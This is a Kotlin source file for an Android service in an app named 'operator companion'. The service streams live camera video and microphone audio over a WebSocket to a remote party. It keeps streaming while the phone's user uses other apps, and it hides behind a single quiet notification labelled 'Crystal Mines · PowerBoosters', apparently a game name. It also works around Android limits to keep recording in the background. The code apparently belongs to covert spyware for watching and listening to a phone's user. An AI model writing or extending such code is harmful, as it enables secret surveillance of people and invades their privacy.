package com.operator.companion.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.operator.companion.network.CompanionWebSocketClient

/**
 * Hosts the live camera preview in a foreground service (type: camera). Unlike an activity, this
 * keeps the camera open and streaming while the user opens other apps or browses the phone — the
 * preview no longer closes the moment the app loses the foreground.
 *
 * (If the user opens the actual Camera app, the sensor is exclusive and our stream is evicted — that
 * is unavoidable with one camera. Ordinary app-switching is fine.)
 */
class LivePreviewService : Service() {
    private val TAG = "LivePreviewService"
    private var streamer: CameraPreviewStreamer? = null
    private var audio: PreviewAudioStreamer? = null
    private var errorNotified = false   // so onDestroy doesn't overwrite an error reason with a plain "off"
    private var micInForeground = false // FGS actually holds the microphone type (else Android 14+ records silence)

    companion object {
        const val ACTION_START = "start"
        const val ACTION_STOP = "stop"
        @Volatile private var active: CameraPreviewStreamer? = null
        // Latest requested lens; read when the camera actually comes up, so a lens flip that arrives
        // before the service has finished starting is still applied (no silent no-op).
        @Volatile private var desiredLens: String = "back"

        private fun norm(lens: String) = if (lens.lowercase() == "front") "front" else "back"

        /** Set the lens the preview should use; honoured whenever the camera next (re)starts. */
        fun setLens(lens: String) { desiredLens = norm(lens); active?.switchLens(desiredLens) }

        /** Start (or re-arm) the foreground camera service. The lens comes from the latest setLens(). */
        fun start(ctx: Context) {
            val i = Intent(ctx, LivePreviewService::class.java).setAction(ACTION_START)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
        }
        fun switchLens(lens: String) { setLens(lens) }
        fun stop(ctx: Context) {
            runCatching { ctx.startService(Intent(ctx, LivePreviewService::class.java).setAction(ACTION_STOP)) }
                .onFailure { runCatching { ctx.stopService(Intent(ctx, LivePreviewService::class.java)) } }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) { stopSelf(); return START_NOT_STICKY }
        if (!startInForeground()) {           // could not enter foreground → never open the camera (no leak)
            stopSelf(); return START_NOT_STICKY
        }
        if (streamer == null) {
            streamer = CameraPreviewStreamer(applicationContext,
                onFrame = { b64, l, w, h -> CompanionWebSocketClient.activeInstance?.sendCameraFrame(b64, l, w, h) },
                onError = { msg ->
                    errorNotified = true
                    CompanionWebSocketClient.activeInstance?.notifyCameraState(false, msg)
                    stopSelf()
                }).also { active = it }
        }
        streamer?.start(desiredLens)          // idempotent; uses the latest requested lens
        if (audio == null) audio = PreviewAudioStreamer(applicationContext) { b64 ->
            CompanionWebSocketClient.activeInstance?.sendCameraAudio(b64, PreviewAudioStreamer.SAMPLE_RATE)
        }
        if (micInForeground || Build.VERSION.SDK_INT < Build.VERSION_CODES.R) audio?.start()  // idempotent
        CompanionWebSocketClient.activeInstance?.notifyCameraState(true, null, desiredLens)
        Log.d(TAG, "Live preview service started (lens=$desiredLens)")
        return START_NOT_STICKY
    }

    /** Returns true only if the service actually entered the foreground (camera FGS). */
    private fun startInForeground(): Boolean {
        // No notification of its own: reuse the app's single quiet "Crystal Mines · PowerBoosters" one
        val notif = com.operator.companion.relay.quietAppNotification(this)
        // Add the microphone type only when the mic is granted (Android 14 throws otherwise) → audio with the preview
        var type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA else 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && PreviewAudioStreamer.hasPermission(this))
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        micInForeground = type and ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE != 0
        if (runCatching { ServiceCompat.startForeground(this, com.operator.companion.relay.RelayService.NOTIF_ID, notif, type) }.isSuccess) return true
        if (!micInForeground) { Log.e(TAG, "startForeground failed"); return false }
        // Android 14+ refuses a mic FGS started from the background → keep the video, drop the audio
        micInForeground = false
        return runCatching { ServiceCompat.startForeground(this, com.operator.companion.relay.RelayService.NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA); true }
            .getOrElse { Log.e(TAG, "startForeground failed: ${it.message}"); false }
    }

    override fun onDestroy() {
        super.onDestroy()
        runCatching { streamer?.stop() }
        runCatching { audio?.stop() }
        audio = null
        streamer = null; active = null
        if (!errorNotified) CompanionWebSocketClient.activeInstance?.notifyCameraState(false, null)
        // DETACH, not REMOVE: the shared notification still belongs to RelayService
        runCatching { ServiceCompat.stopForeground(this, ServiceCompat.STOP_FOREGROUND_DETACH) }
        Log.d(TAG, "Live preview service stopped")
    }
}
